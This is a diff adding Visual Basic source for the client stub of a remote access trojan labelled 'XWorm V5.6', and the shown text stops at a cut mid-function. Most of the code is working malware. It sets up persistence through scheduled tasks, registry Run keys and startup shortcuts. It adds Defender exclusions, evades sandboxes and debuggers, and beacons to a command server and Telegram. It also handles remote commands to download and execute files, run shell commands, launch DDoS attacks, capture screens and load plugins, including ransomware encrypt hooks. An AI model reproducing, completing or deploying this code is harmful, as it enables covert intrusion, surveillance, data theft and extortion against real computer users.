@@ -1,0 +1,1920 @@
+Imports System
+Imports System.Security.Cryptography
+Imports System.Text
+Imports System.Diagnostics
+Imports System.IO
+Imports System.Management
+Imports System.Net.Sockets
+Imports System.Runtime.CompilerServices
+Imports System.Security.Principal
+Imports System.Threading
+Imports Microsoft.VisualBasic.CompilerServices
+Imports Microsoft.VisualBasic.Devices
+Imports System.Windows.Forms
+Imports System.Net
+Imports System.Runtime.InteropServices
+Imports System.Collections.Generic
+Imports System.Drawing
+Imports System.Drawing.Imaging
+Imports System.Linq
+Imports System.Reflection
+Imports Microsoft.VisualBasic
+Imports Microsoft.Win32
+Imports System.Drawing.Drawing2D
+Imports System.Threading.Tasks
+Imports System.Text.RegularExpressions
+Imports System.IO.Compression
+
+
+<Assembly: AssemblyTitle("%Title%")>
+<Assembly: AssemblyDescription("%Des%")>
+<Assembly: AssemblyCompany("%Company%")>
+<Assembly: AssemblyProduct("%Product%")>
+<Assembly: AssemblyCopyright("%Copyright%")>
+<Assembly: AssemblyTrademark("%Trademark%")>
+<Assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
+<Assembly: AssemblyVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")>
+<Assembly: Guid("%Guid%")>
+
+
+#Const USBLNK = False
+
+#Const RegAdd = False
+#Const Schtasks = False
+#Const Startup = False
+
+#Const Pastebin = False
+#Const Analysis = False
+
+#Const Logger = False
+#Const Clipper = False
+#Const BDOS = False
+#Const TelegramBot = False
+#Const WDEX = False
+
+Public Class Settings
+
+#If Pastebin Then
+    Public Shared PasteUrl As String = "%PasteUrl%"
+#End If
+
+#If Not Pastebin Then
+    Public Shared Hosts As String = "%Hosts%"
+#End If
+
+    Public Shared Host As String
+
+#If Pastebin Then
+    Public Shared Port As String 
+#Else
+    Public Shared Port As String = "%Port%"
+#End If
+
+    Public Shared KEY As String = "%KEY%"
+    Public Shared SPL As String = "%SPL%"
+    Public Shared Sleep As Integer = %Sleep% 
+    Public Shared Groub As String = "%Groub%"
+
+    Public Shared USBNM As String = "%USB%"
+
+
+#If RegAdd Or Schtasks Or Startup Then
+    Public Shared InstallDir As String = "%Path%"
+    Public Shared InstallStr As String = "%Name%"
+#End If
+
+
+    Public Shared Mutex As String = "%Mutex%"
+
+
+#If Logger Then
+    Public Shared LoggerPath As String = Environ$("temp") & "\Log.tmp"
+#End If
+
+#If Clipper Then
+    Public Shared BTC As String = "%BTC%"
+    Public Shared ETH As String = "%ETH%"
+    Public Shared TRC As String = "%Trc20%"
+#End If
+
+
+#If TelegramBot Then
+    Public Shared Token As String = "%Token%"
+    Public Shared ChatID As String = "%ChatID%"
+#End If
+
+
+End Class
+
+Namespace Stub
+    Public Class Main
+        Public Shared Sub Main()
+
+
+            Threading.Thread.Sleep(Settings.Sleep * 1000)
+
+            Try
+
+#If Not Pastebin Then
+                Settings.Hosts = AlgorithmAES.Decrypt(Settings.Hosts)
+                Settings.Port = AlgorithmAES.Decrypt(Settings.Port)
+#End If
+
+
+                Settings.KEY = AlgorithmAES.Decrypt(Settings.KEY)
+                Settings.SPL = AlgorithmAES.Decrypt(Settings.SPL)
+                Settings.Groub = AlgorithmAES.Decrypt(Settings.Groub)
+                Settings.USBNM = AlgorithmAES.Decrypt(Settings.USBNM)
+
+#If Pastebin Then
+                Settings.PasteUrl = AlgorithmAES.Decrypt(Settings.PasteUrl)
+#End If
+
+
+#If RegAdd Or Schtasks Or Startup Then
+                Settings.InstallDir = Environment.ExpandEnvironmentVariables(AlgorithmAES.Decrypt(Settings.InstallDir))
+                Settings.InstallStr = AlgorithmAES.Decrypt(Settings.InstallStr)
+#End If
+
+#If Clipper Then
+                Settings.BTC = AlgorithmAES.Decrypt(Settings.BTC)
+                Settings.ETH = AlgorithmAES.Decrypt(Settings.ETH)
+                Settings.TRC = AlgorithmAES.Decrypt(Settings.TRC)
+#End If
+
+#If TelegramBot Then
+                Settings.Token = AlgorithmAES.Decrypt(Settings.Token)
+                Settings.ChatID = AlgorithmAES.Decrypt(Settings.ChatID)
+#End If
+
+            Catch ex As Exception
+                Environment.Exit(0)
+            End Try
+
+
+            If Not CreateMutex() Then Environment.Exit(0)
+
+#If Analysis Then
+            Try
+                RunAntiAnalysis()
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+#If WDEX Then
+            Exclusion()
+#End If
+
+
+#If RegAdd Or Schtasks Or Startup Then
+            Dim outpath As String = Settings.InstallDir & "\" & Settings.InstallStr
+            Try
+                Dim Dir = New FileInfo(outpath).Directory.FullName
+                If Not IO.Directory.Exists(Dir) Then
+                    IO.Directory.CreateDirectory(Dir)
+                End If
+                If IO.File.Exists(outpath) Then
+                    Dim t As New FileInfo(outpath)
+                    t.Delete()
+                End If
+                Thread.Sleep(1000)
+                IO.File.WriteAllBytes(outpath, IO.File.ReadAllBytes(current))
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+#If Schtasks Then
+            Try
+                Dim PSInfo As New ProcessStartInfo("schtasks.exe")
+                PSInfo.WindowStyle = ProcessWindowStyle.Hidden
+                If ClientSocket.UAC Then
+                    PSInfo.Arguments = ("/create /f /RL HIGHEST /sc minute /mo 1 /tn " & """" & IO.Path.GetFileNameWithoutExtension(Settings.InstallStr) & """" & " /tr " & """" & outpath & """")
+                Else
+                    PSInfo.Arguments = ("/create /f /sc minute /mo 1 /tn " & """" & IO.Path.GetFileNameWithoutExtension(Settings.InstallStr) & """" & " /tr " & """" & outpath & """")
+                End If
+                Dim PS As Process = Process.Start(PSInfo)
+                PS.WaitForExit()
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+#If RegAdd Then
+            Try
+                My.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(IO.Path.GetFileNameWithoutExtension(Settings.InstallStr), outpath)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+#If Startup Then
+            Try
+                Dim SPath As String = Environment.GetFolderPath(7) & "\" & IO.Path.GetFileNameWithoutExtension(Settings.InstallStr) & ".lnk"
+                With CreateObject("WScript.Shell").CreateShortcut(SPath)
+                    .TargetPath = outpath
+                    .WorkingDirectory = ""
+                    .Save()
+                End With
+                fileStream = New FileStream(SPath, FileMode.Open)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+
+
+#If USBLNK Then
+            USB.USBStart()
+#End If
+
+
+#If Pastebin Then
+            Dim ConInfo As String = DownloadStr(Settings.PasteUrl)
+            Settings.Host = ConInfo.Split(":")(0)
+            Settings.Port = ConInfo.Split(":")(1)
+#End If
+
+
+            PreventSleep()
+
+
+#If Logger Then
+            Call New Thread(Sub() XLogger.callk()).Start()
+#End If
+
+#If Clipper Then
+            Call New Thread(Sub() Clipper.Run()).Start()
+#End If
+
+
+#If BDOS Then
+            If ClientSocket.UAC Then
+                ProcessCritical.CriticalProcess_Enable()
+            End If
+#End If
+
+#If TelegramBot Then
+            SendBot()
+#End If
+
+            Dim T1 As New Threading.Thread(AddressOf LastAct)
+            Dim T2 As New Threading.Thread(Sub()
+                                               While True
+                                                   Thread.Sleep(New Random().Next(3000, 10000))
+                                                   If ClientSocket.isConnected = False Then
+                                                       ClientSocket.isDisconnected()
+                                                       ClientSocket.BeginConnect()
+                                                   End If
+                                                   ClientSocket.allDone.WaitOne()
+                                               End While
+                                           End Sub)
+            T1.Start()
+            T2.Start()
+            T2.Join()
+        End Sub
+
+
+
+#If Pastebin Then
+        Public Shared Function DownloadStr(ByVal url As String) As String
+            Try
+                ServicePointManager.Expect100Continue = True
+                ServicePointManager.SecurityProtocol = DirectCast(3072, SecurityProtocolType)
+                ServicePointManager.DefaultConnectionLimit = 9999
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+            Try
+Re:
+                Using wc As New WebClient
+                    Return wc.DownloadString(url)
+                End Using
+            Catch ex As Exception
+                Threading.Thread.Sleep(3000)
+                GoTo Re
+            End Try
+        End Function
+#End If
+
+#If TelegramBot Then
+        Public Shared Sub SendBot()
+            Try
+                Try
+                    ServicePointManager.Expect100Continue = True
+                    ServicePointManager.SecurityProtocol = DirectCast(3072, SecurityProtocolType)
+                    ServicePointManager.DefaultConnectionLimit = 9999
+                Catch ex As Exception
+                    Debug.WriteLine(ex.Message)
+                End Try
+                Using Web As New WebClient
+                    Dim Line As String = Environment.NewLine
+                    Dim Info As String = "☠ [XWorm V5.6]" & Line & Line & "New Clinet : " & Line & ID() & Line & Line & "UserName : " & Environment.UserName & Line & "OSFullName : " & My.Computer.Info.OSFullName & Line & "USB : " & ClientSocket.Spread() & Line & "CPU : " & ClientSocket.CPU & Line & "GPU : " & ClientSocket.GPU & Line & "RAM : " & ClientSocket.RAM & Line & "Groub : " & Settings.Groub
+                    Web.DownloadString(("https://api.telegram.org/bot" & Settings.Token & "/sendMessage?chat_id=" & Settings.ChatID & "&text=" & Info))
+                End Using
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+        End Sub
+#End If
+
+#If WDEX Then
+        Public Shared Sub Exclusion()
+            If ClientSocket.UAC Then
+                Try
+                    Dim StartInfo As New ProcessStartInfo
+                    StartInfo.FileName = "powershell.exe"
+                    StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+
+                    StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " & "'" & current & "'"
+                    Process.Start(StartInfo).WaitForExit()
+
+                    StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess " & "'" & Process.GetCurrentProcess.MainModule.ModuleName & "'"
+                    Process.Start(StartInfo).WaitForExit()
+
+
+#If RegAdd Or Schtasks Or Startup Then
+
+                    StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " & "'" & Settings.InstallDir & "\" & Settings.InstallStr & "'"
+                    Process.Start(StartInfo).WaitForExit()
+
+                    StartInfo.Arguments = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess " & "'" & IO.Path.GetFileName(Settings.InstallStr) & "'"
+                    Process.Start(StartInfo).WaitForExit()
+#End If
+
+                Catch ex As Exception
+                    Debug.WriteLine(ex.Message)
+                End Try
+            End If
+        End Sub
+#End If
+
+#If Analysis Then
+        Public Shared Sub RunAntiAnalysis()
+            If DetectManufacturer() OrElse DetectDebugger() OrElse DetectSandboxie() OrElse IsXP() OrElse anyrun() Then Environment.FailFast(Nothing)
+        End Sub
+
+        Private Shared Function anyrun() As Boolean
+            Try
+                Dim status As String = New System.Net.WebClient().DownloadString("http://ip-api.com/line/?fields=hosting")
+                Return status.Contains("true")
+            Catch
+            End Try
+            Return False
+        End Function
+
+        Private Shared Function IsXP() As Boolean
+            Try
+                If New Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp") Then
+                    Return True
+                End If
+            Catch
+            End Try
+            Return False
+        End Function
+
+        Private Shared Function DetectManufacturer() As Boolean
+            Try
+                Using searcher = New ManagementObjectSearcher("Select * from Win32_ComputerSystem")
+                    Dim item
+                    Using items = searcher.[Get]()
+                        For Each item In items
+                            Dim manufacturer As String = item("Manufacturer").ToString().ToLower()
+                            If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
+                                Return True
+                            End If
+                        Next
+                    End Using
+                End Using
+            Catch
+            End Try
+            Return False
+        End Function
+        Private Shared Function DetectDebugger() As Boolean
+            Dim isDebuggerPresent As Boolean = False
+            Try
+                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, isDebuggerPresent)
+                Return isDebuggerPresent
+            Catch
+                Return isDebuggerPresent
+            End Try
+        End Function
+
+        Private Shared Function DetectSandboxie() As Boolean
+            Try
+                If GetModuleHandle("SbieDll.dll").ToInt32() <> 0 Then
+                    Return True
+                Else
+                    Return False
+                End If
+            Catch
+                Return False
+            End Try
+        End Function
+        <DllImport("kernel32.dll")>
+        Public Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
+        End Function
+        <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)>
+        Public Shared Function CheckRemoteDebuggerPresent(ByVal hProcess As IntPtr, ByRef isDebuggerPresent As Boolean) As Boolean
+        End Function
+#End If
+    End Class
+    Public Class ClientSocket
+
+        Public Shared isConnected As Boolean = False
+        Public Shared S As Socket = Nothing
+        Private Shared BufferLength As Long = Nothing
+        Private Shared Buffer() As Byte
+        Private Shared MS As MemoryStream = Nothing
+        Private Shared Tick As Threading.Timer = Nothing
+        Public Shared allDone As New ManualResetEvent(False)
+        Private Shared SendSync As Object = Nothing
+
+        Public Shared Speed As Threading.Timer
+        Public Shared Interval As Integer
+        Public Shared ActivatePong As Boolean
+        Public Shared Sub BeginConnect()
+
+#If Pastebin Then
+
+            ConnectServer(Settings.Host)
+
+#Else
+            Try
+                Dim ServerIP As String = Settings.Hosts.Split(","c)(New Random().[Next](Settings.Hosts.Split(","c).Length))
+
+                If IsValidDomainName(ServerIP) Then
+
+                    Dim addresslist As IPAddress() = Dns.GetHostAddresses(ServerIP)
+
+                    For Each theaddress As IPAddress In addresslist
+
+                        Try
+                            Debug.WriteLine(theaddress.ToString)
+                            ConnectServer(theaddress.ToString)
+                            If isConnected Then Exit For
+                        Catch
+                        End Try
+
+                    Next
+                Else
+                    Debug.WriteLine(ServerIP)
+                    ConnectServer(ServerIP)
+                End If
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+#End If
+        End Sub
+
+        Public Shared Function ConnectServer(ByVal H As String)
+            Try
+                S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+
+                BufferLength = -1
+                Buffer = New Byte(0) {}
+                MS = New MemoryStream
+
+                S.ReceiveBufferSize = 50 * 1024
+                S.SendBufferSize = 50 * 1024
+
+
+                S.Connect(H, Settings.Port)
+
+                Settings.Host = H
+
+                Debug.WriteLine("Connect : Connected")
+
+                isConnected = True
+                SendSync = New Object()
+                Send(Info)
+
+                ActivatePong = False
+
+                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
+
+                Dim T As New TimerCallback(AddressOf Ping)
+                Tick = New Threading.Timer(T, Nothing, New Random().Next(10 * 1000, 15 * 1000), New Random().Next(10 * 1000, 15 * 1000))
+                Speed = New Threading.Timer(New TimerCallback(AddressOf Pong), Nothing, 1, 1)
+            Catch ex As Exception
+                Debug.WriteLine("Connect : Failed")
+                isConnected = False
+            Finally
+                allDone.Set()
+            End Try
+
+        End Function
+        Public Shared Function Info()
+
+            Dim OS As New Devices.ComputerInfo
+            Return String.Concat("INFO", Settings.SPL, (ID()), Settings.SPL, Environment.UserName, Settings.SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") & " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), Settings.SPL, Settings.Groub, Settings.SPL, INDATE(), Settings.SPL, Spread(), Settings.SPL, UAC, Settings.SPL, Messages.Cam, Settings.SPL, CPU, Settings.SPL, GPU, Settings.SPL, RAM, Settings.SPL, Antivirus())
+
+        End Function
+        Public Shared Function INDATE() As String
+            Try
+                Dim file As New IO.FileInfo(current)
+                Return CType(file, IO.FileInfo).LastWriteTime.ToString("dd/MM/yyy")
+            Catch ex As Exception
+                Return "Error"
+            End Try
+        End Function
+        Public Shared Function Spread() As String
+            Try
+                If IO.Path.GetFileName(current) = Settings.USBNM Then
+                    Return "True"
+                Else
+                    Return "False"
+                End If
+            Catch ex As Exception
+                Return "Error"
+            End Try
+        End Function
+        Public Shared Function UAC() As String
+            Try
+                Return New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString
+            Catch ex As Exception
+                Return "Error"
+            End Try
+        End Function
+        Public Shared Function Antivirus() As String
+            Try
+                Using antiVirusSearch As ManagementObjectSearcher = New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "Select * from AntivirusProduct")
+                    Dim AV As StringBuilder = New StringBuilder()
+
+                    For Each searchResult As ManagementBaseObject In antiVirusSearch.[Get]()
+                        AV.Append(searchResult("displayName").ToString())
+                        AV.Append(",")
+                    Next
+                    If AV.ToString().Length = 0 Then Return "None"
+                    Return AV.ToString().Substring(0, AV.Length - 1)
+                End Using
+            Catch ex As Exception
+                Return "None"
+            End Try
+        End Function
+
+        Public Shared Function GPU() As String
+            Try
+                Dim VideoCard As String = String.Empty
+                Dim objquery As New Management.ObjectQuery("SELECT * FROM Win32_VideoController")
+                Dim objSearcher As New Management.ManagementObjectSearcher(objquery)
+
+                For Each MemObj As Management.ManagementObject In objSearcher.Get
+                    VideoCard = VideoCard & (MemObj("Name")) & " "
+                Next
+                Return VideoCard
+            Catch
+                Return "Error"
+            End Try
+        End Function
+
+        Public Shared Function CPU() As String
+            Try
+                Dim P As New Management.ManagementObject("Win32_Processor.deviceid=""CPU0""")
+                P.Get()
+                Return P("Name").ToString.Replace("(R)", "").Replace("Core(TM)", "").Replace("CPU", "")
+                Return P("Name").ToString
+            Catch ex As Exception
+                Return "Error"
+            End Try
+        End Function
+
+        Public Shared Function RAM() As String
+            Try
+                Dim x As String = Nothing
+                Dim PH As Long = Val(My.Computer.Info.TotalPhysicalMemory)
+                If PH > 1073741824 Then
+                    x = (PH / 1073741824).ToString
+                    x = x.Remove(4, x.Length - 4) & " GB"
+                ElseIf PH > 1048576 Then
+                    x = (PH / 1048576).ToString
+                    x = x.Remove(4, x.Length - 4) & " MB"
+                End If
+                Return x
+            Catch ex As Exception
+                Return "Error"
+            End Try
+        End Function
+
+        Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
+            If isConnected = False Then Return
+
+            Try
+                Dim Received As Integer = S.EndReceive(ar)
+                If Received > 0 Then
+                    If BufferLength = -1 Then
+                        If Buffer(0) = 0 Then
+                            BufferLength = BS(MS.ToArray)
+                            MS.Dispose()
+                            MS = New MemoryStream
+
+                            If BufferLength = 0 Then
+                                BufferLength = -1
+                                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
+                                Exit Sub
+                            End If
+                            Buffer = New Byte(BufferLength - 1) {}
+                        Else
+                            MS.WriteByte(Buffer(0))
+                        End If
+                    Else
+                        MS.Write(Buffer, 0, Received)
+                        If (MS.Length = BufferLength) Then
+
+                            Dim thread = New Thread(AddressOf BeginRead)
+                            thread.Start(MS.ToArray)
+
+                            BufferLength = -1
+                            MS.Dispose()
+                            MS = New MemoryStream
+                            Buffer = New Byte(0) {}
+                        Else
+                            Buffer = New Byte(BufferLength - MS.Length - 1) {}
+                        End If
+                    End If
+                Else
+                    isConnected = False
+                    Return
+                End If
+                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
+            Catch ex As Exception
+                isConnected = False
+                Return
+            End Try
+        End Sub
+        Public Shared Sub BeginRead(ByVal b As Byte())
+            Try
+                Messages.Read(b)
+            Catch ex As Exception
+            End Try
+        End Sub
+        Public Shared Sub Send(ByVal msg As String)
+            SyncLock SendSync
+                If isConnected = True Then
+                    Try
+                        Using MS As New MemoryStream
+                            Dim B As Byte() = AES_Encryptor(SB(msg))
+                            Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
+
+                            MS.Write(L, 0, L.Length)
+                            MS.Write(B, 0, B.Length)
+
+                            S.Poll(-1, SelectMode.SelectWrite)
+                            S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
+                        End Using
+                    Catch ex As Exception
+                        Debug.WriteLine("Send : Failed")
+                        isConnected = False
+                    End Try
+                End If
+            End SyncLock
+        End Sub
+
+        Public Shared Sub EndSend(ByVal ar As IAsyncResult)
+            Try
+                S.EndSend(ar)
+            Catch ex As Exception
+                Debug.WriteLine("EndSend : Failed")
+                isConnected = False
+            End Try
+        End Sub
+
+        Public Shared Sub isDisconnected()
+
+            If Tick IsNot Nothing Then
+                Try
+                    Tick.Dispose()
+                    Tick = Nothing
+                Catch ex As Exception
+                    Debug.WriteLine("Tick.Dispose")
+                End Try
+            End If
+
+            If Speed IsNot Nothing Then
+                Try
+                    Speed.Dispose()
+                    Speed = Nothing
+                Catch ex As Exception
+                    Debug.WriteLine("Speed.Dispose")
+                End Try
+            End If
+
+            If MS IsNot Nothing Then
+                Try
+                    MS.Close()
+                    MS.Dispose()
+                    MS = Nothing
+                Catch ex As Exception
+                    Debug.WriteLine("MS.Dispose")
+                End Try
+            End If
+
+            If S IsNot Nothing Then
+                Try
+                    S.Close()
+                    S.Dispose()
+                    S = Nothing
+                Catch ex As Exception
+                    Debug.WriteLine("S.Dispose")
+                End Try
+            End If
+            GC.Collect()
+        End Sub
+
+        Public Shared Sub Pong(ByVal obj As Object)
+            Try
+                If ActivatePong AndAlso isConnected Then
+                    Interval += 1
+                End If
+            Catch
+            End Try
+        End Sub
+
+        Public Shared Sub Ping()
+            Try
+                If isConnected = True Then
+                    Send("PING!" & Settings.SPL & GetActiveWindowTitle() & Settings.SPL & Time)
+                    ActivatePong = True
+                    GC.Collect()
+                End If
+            Catch ex As Exception
+            End Try
+        End Sub
+    End Class
+    Public Class Messages
+        Public Shared Pack As String()
+        Public Shared Sub Read(ByVal b As Byte())
+            Try
+                Dim A As String() = Split(BS(AES_Decryptor(b)), Settings.SPL)
+                Select Case A(0)
+
+                    Case "pong"
+                        ClientSocket.ActivatePong = False
+                        ClientSocket.Send("pong" & Settings.SPL & ClientSocket.Interval)
+                        ClientSocket.Interval = 0
+
+                    Case "rec"
+#If BDOS Then
+                        ProcessCritical.CriticalProcesses_Disable()
+#End If
+                        CloseMutex()
+                        Application.Restart()
+                        Environment.Exit(0)
+
+                    Case "CLOSE"
+#If BDOS Then
+                        ProcessCritical.CriticalProcesses_Disable()
+#End If
+                        ClientSocket.S.Shutdown(Net.Sockets.SocketShutdown.Both)
+                        ClientSocket.S.Close()
+                        Environment.Exit(0)
+
+                    Case "uninstall"
+                        Uninstaller.UNS(False, Nothing, Nothing)
+
+                    Case "update"
+                        Uninstaller.UNS(True, A(1), Decompress(Convert.FromBase64String(A(2))))
+
+                    Case "DW"
+                        RunDisk(A(1), Decompress(Convert.FromBase64String(A(2))))
+
+
+                    Case "FM"
+                        Memory(Decompress(Convert.FromBase64String(A(1))))
+
+
+
+                    Case "LN"
+                        Try
+                            ServicePointManager.Expect100Continue = True
+                            ServicePointManager.SecurityProtocol = DirectCast(3072, SecurityProtocolType)
+                            ServicePointManager.DefaultConnectionLimit = 9999
+                        Catch
+                        End Try
+                        Dim temp As String = Path.Combine(Path.GetTempPath(), GetRandomString(6) & A(1))
+                        Dim webClient As New System.Net.WebClient()
+                        webClient.DownloadFile(A(2), temp)
+                        Process.Start(temp)
+
+
+                    Case "Urlopen"
+                        OpenUrl(A(1), False)
+                    Case "Urlhide"
+                        OpenUrl(A(1), True)
+
+
+                    Case "PCShutdown"
+                        Shell("shutdown.exe /f /s /t 0", AppWinStyle.Hide)
+                    Case "PCRestart"
+                        Shell("shutdown.exe /f /r /t 0", AppWinStyle.Hide)
+                    Case "PCLogoff"
+                        Shell("shutdown.exe -L", AppWinStyle.Hide)
+                    Case "RunShell"
+                        Shell(A(1), AppWinStyle.Hide)
+
+                    Case "StartDDos"
+                        Try
+                            DDos.Abort()
+                        Catch ex As Exception
+                        End Try
+
+                        DDos = New Thread(AddressOf TD)
+                        DDos.Start(A(1))
+
+                    Case "StopDDos"
+                        Try
+                            DDos.Abort()
+                        Catch ex As Exception
+                        End Try
+
+
+                    Case "StartReport"
+                        Try
+                            ReportWindow.Abort()
+                        Catch ex As Exception
+                        End Try
+
+                        ReportWindow = New Thread(AddressOf Monitoring)
+                        ReportWindow.Start(A(1))
+
+                    Case "StopReport"
+                        Try
+                            ReportWindow.Abort()
+                        Catch ex As Exception
+                        End Try
+
+
+                    Case "Xchat"
+                        ClientSocket.Send("Xchat" & Settings.SPL & ID())
+
+
+                    Case "Hosts"
+                        Dim Hosts As String = Environment.GetFolderPath(Environment.SpecialFolder.System) & "\drivers\etc\hosts"
+                        ClientSocket.Send("Hosts" & Settings.SPL & ID() & Settings.SPL & Hosts & Settings.SPL & IO.File.ReadAllText(Hosts))
+
+                    Case "Shosts"
+                        Try
+                            IO.File.WriteAllText(A(1), A(2))
+                            ClientSocket.Send("HostsMSG" & Settings.SPL & ID() & Settings.SPL & "Modified successfully!")
+                        Catch ex As Exception
+                            ClientSocket.Send("HostsErr" & Settings.SPL & ID() & Settings.SPL & ex.Message)
+                        End Try
+
+
+                    Case "DDos"
+                        ClientSocket.Send("DDos")
+
+
+                    Case "plugin"
+                        Pack = A
+                        If GetValue(A(1)) Is Nothing Then
+                            ClientSocket.Send("sendPlugin" & Settings.SPL & A(1))
+                        Else
+                            Plugin(Decompress(GetValue(A(1))))
+                        End If
+
+                    Case "savePlugin"
+                        Dim Dll As Byte() = Convert.FromBase64String(A(2))
+                        SetValue(A(1), Dll)
+                        Plugin(Decompress(Dll))
+
+                    Case "RemovePlugins"
+                        My.Computer.Registry.CurrentUser.DeleteSubKey(PL)
+                        SendMSG("Plugins Removed!")
+
+
+                    Case "OfflineGet"
+#If Logger Then
+                        ClientSocket.Send("OfflineGet" & Settings.SPL & ID() & Settings.SPL & IO.File.ReadAllText(Settings.LoggerPath))
+#Else
+                        SendError("OfflineKeylogger Not Enabled")
+#End If
+
+                    Case "$Cap"
+                        Try
+                            Try
+                                If Not ProcessDpi Then
+                                    SetProcessDpiAwareness(2)
+                                    ProcessDpi = True
+                                End If
+                            Catch : End Try
+                            Dim bounds As Drawing.Rectangle = Screen.PrimaryScreen.Bounds
+                            Dim image As New Drawing.Bitmap(Screen.PrimaryScreen.Bounds.Width, bounds.Height, Drawing.Imaging.PixelFormat.Format16bppRgb555)
+                            Dim _g As Drawing.Graphics = Drawing.Graphics.FromImage(image)
+                            Dim blockRegionSize As New Drawing.Size(image.Width, image.Height)
+                            _g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, Drawing.CopyPixelOperation.SourceCopy)
+                            Dim MM As New IO.MemoryStream
+                            Dim THU As New Drawing.Bitmap(256, 156)
+                            Dim G As Drawing.Graphics = Drawing.Graphics.FromImage(THU)
+                            G.DrawImage(image, New Drawing.Rectangle(0, 0, 256, 156), New Drawing.Rectangle(0, 0, image.Width, image.Height), Drawing.GraphicsUnit.Pixel)
+                            THU.Save(MM, System.Drawing.Imaging.ImageFormat.Jpeg)
+                            ClientSocket.Send("#CAP" & Settings.SPL & ID() & Settings.SPL & Convert.ToBase64String(Compress(MM.ToArray)))
+                            Try
+                                _g.Dispose()
+                                MM.Dispose()
+                                THU.Dispose()
+                                G.Dispose()
+                                image.Dispose()
+                            Catch : End Try
+                        Catch ex As Exception
+                        End Try
+
+                End Select
+            Catch ex As Exception
+                SendError(ex.Message)
+            End Try
+
+        End Sub
+
+        Public Shared RS As Integer
+        Public Shared Sub Plugin(ByVal B() As Byte)
+            Try
+                For Each Type_ As Type In AppDomain.CurrentDomain.Load(B).GetTypes
+
+                    If Type_.Name = "Plugin" Then
+                        Dim GM As Object
+                        For Each GM In Type_.GetMethods
+
+                            If GM.Name = "Run" Then
+                                GM.Invoke(Nothing, New Object() {Settings.Host, Settings.Port, Settings.SPL, Settings.KEY, ID()})
+                                Exit Sub
+
+                            ElseIf GM.Name = "RunRecovery" Then
+                                ClientSocket.Send("Recovery" & Settings.SPL & ID() & Settings.SPL & Convert.ToInt32(Messages.Pack(2)) & Settings.SPL & GM.Invoke(Nothing, New Object() {Convert.ToInt32(Messages.Pack(2))}))
+                                Exit Sub
+
+
+                            ElseIf GM.Name = "RunOptions" Then
+                                Dim Logs As String = GM.Invoke(Nothing, New Object() {Messages.Pack(2)})
+                                If Logs.StartsWith("Error") Then
+                                    SendError(Logs)
+                                Else
+                                    SendMSG(Logs)
+                                End If
+                                Exit Sub
+
+                            ElseIf GM.Name = "injRun" Then
+                                If IO.File.Exists(Messages.Pack(2)) Then
+                                    GM.Invoke(Nothing, New Object() {Messages.Pack(2), Decompress(Convert.FromBase64String(Messages.Pack(3)))})
+                                End If
+                                Exit Sub
+
+
+
+                            ElseIf GM.Name = "UACFunc" Then
+                                SendError(GM.Invoke(Nothing, New Object() {Convert.ToInt32(Messages.Pack(2))}))
+                                Exit Sub
+
+
+                            ElseIf GM.Name = "ENC" Then
+                                If Convert.ToBoolean(Messages.Pack(2)) = True Then
+                                    If Not RS = 1 Then
+                                        RS = 1
+                                        SendMSG(GM.Invoke(Nothing, New Object() {ID(), Decompress(Convert.FromBase64String(Messages.Pack(3))), Messages.Pack(4), Messages.Pack(5), Messages.Pack(6)}))
+                                        RS = 2
+                                    End If
+                                    Exit Sub
+                                End If
+
+                            ElseIf GM.Name = "DEC" Then
+                                If Convert.ToBoolean(Messages.Pack(2)) = False Then
+                                    If RS = 2 Then
+                                        RS = 1
+                                        SendMSG(GM.Invoke(Nothing, New Object() {ID()}))
+                                        RS = 0
+                                    End If
+                                    Exit Sub
+                                End If
+
+                            End If
+                        Next
+                    End If
+                Next
+            Catch ex As Exception
+                SendError("Plugin Error! " & ex.Message)
+            End Try
+        End Sub
+
+
+        Public Shared Sub SendMSG(ByVal msg As String)
+            Try
+                ClientSocket.Send("Msg" & Settings.SPL & msg)
+            Catch ex As Exception
